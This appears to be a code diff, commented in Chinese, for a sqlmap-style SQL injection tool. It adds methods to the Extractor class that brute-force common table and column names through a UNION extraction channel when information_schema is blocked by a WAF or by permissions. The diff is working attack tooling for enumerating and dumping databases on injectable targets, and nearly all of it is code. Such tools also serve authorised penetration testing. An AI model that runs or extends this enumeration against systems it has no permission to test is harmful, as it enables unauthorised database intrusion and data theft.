@@ -26,6 +26,8 @@ import {
   resolveFromClause, WRAP, escSql, WRAP_NOCAST,
 } from './DialectSqlBuilder.js';
 import { logger } from '../core/logger.js';
+// [对标 sqlmap --common-tables/--common-columns] 字典（information_schema 不可用时的枚举出路）
+import { COMMON_TABLES, COMMON_COLUMNS, NONEXISTENT_PROBE } from './commonNames.js';
 // [P0-FIX] 提取路径放大响应上限：防大表拖库被 5MB 默认上限截断
 import { EXTRACT_MAX_BODY_BYTES } from '../core/httpClient.js';
 // [P0-FIX] 布尔提取复用检测层 autoDynamicBlock：与 Detector 共用同一份
@@ -513,6 +515,58 @@ export class Extractor {
     if (val == null || val === '') return null;
     const n = Number(String(val).trim());
     return Number.isFinite(n) ? n : null;
+  }
+
+  // ===== [sqlmap 对标 --common-tables / --common-columns] 字典爆破 =====
+  // 场景：information_schema 不可用（被 WAF 拦 / 账号权限不足 / 目标库无该视图）。
+  // 原理：对字典中每个候选名做存在性探针——
+  //   存在   → extractScalar 拿到值（行数可以是 0，但值本身非 null）
+  //   不存在 → SQL 报错 → UNION 提取失败 → null
+  // 防误判（关键）：先跑「通道自检」（提取常量 '1'）与「不存在对照名」。
+  //   若自检为 null，说明提取通道本身不可用 —— 此时必须返回 CHANNEL_UNAVAILABLE，
+  //   而不是返回空结果让上层误读成「目标确实没有这些表」（假阴性）。
+  async findCommonTables(ctx, db) {
+    const columns = await this._guessColumnsCached(ctx);
+    const sanity = await this.extractScalar(ctx, '1', columns);
+    if (sanity == null) {
+      logger.warn('common-tables：提取通道不可用（常量回显失败），字典爆破跳过');
+      return { tables: [], tried: 0, found: 0, reason: 'CHANNEL_UNAVAILABLE' };
+    }
+    // 对照名必须不存在：若连它都能"取到行数"，说明该目标的提取结果不可信，宁可不出结论
+    let control = null;
+    try { control = await this.countRows(ctx, db, NONEXISTENT_PROBE); } catch { control = null; }
+    if (control !== null) {
+      logger.warn('common-tables：不存在对照名竟返回行数，判定不可靠，跳过');
+      return { tables: [], tried: 0, found: 0, reason: 'CONTROL_UNRELIABLE' };
+    }
+    const found = [];
+    for (const t of COMMON_TABLES) {
+      let n = null;
+      try { n = await this.countRows(ctx, db, t); } catch { n = null; }
+      if (n !== null) {
+        found.push(t);
+        logger.info(`common-tables 命中：${db}.${t}（行数 ${n}）`);
+      }
+    }
+    logger.info(`common-tables 汇总：db=${db} 尝试 ${COMMON_TABLES.length} 个候选名，命中 ${found.length} 个`);
+    return { tables: found, tried: COMMON_TABLES.length, found: found.length };
+  }
+
+  // 列名字典爆破（对标 sqlmap --common-columns）：表存在性由调用方保证（-T 指定或 commonTables 结果）。
+  // 探针 `SELECT COUNT(<col>) FROM <t>`：列不存在 → 报错 → null；存在（哪怕全 NULL）→ 数字。
+  async findCommonColumns(ctx, db, table) {
+    if (!table) return { columns: [], tried: 0, found: 0, reason: 'NO_TABLE' };
+    const edb = resolveDbms(ctx.dbms);
+    const columns = await this._guessColumnsCached(ctx);
+    const found = [];
+    for (const c of COMMON_COLUMNS) {
+      let val = null;
+      try {
+        val = await this.extractScalar(ctx, `(SELECT COUNT(${c}) FROM ${tableRef(edb, db, table)})`, columns);
+      } catch { val = null; }
+      if (val !== null) found.push(c);
+    }
+    return { columns: found, tried: COMMON_COLUMNS.length, found: found.length };
   }
 
   // 带 WHERE 条件的行数统计（对标 sqlmap --count --where）：
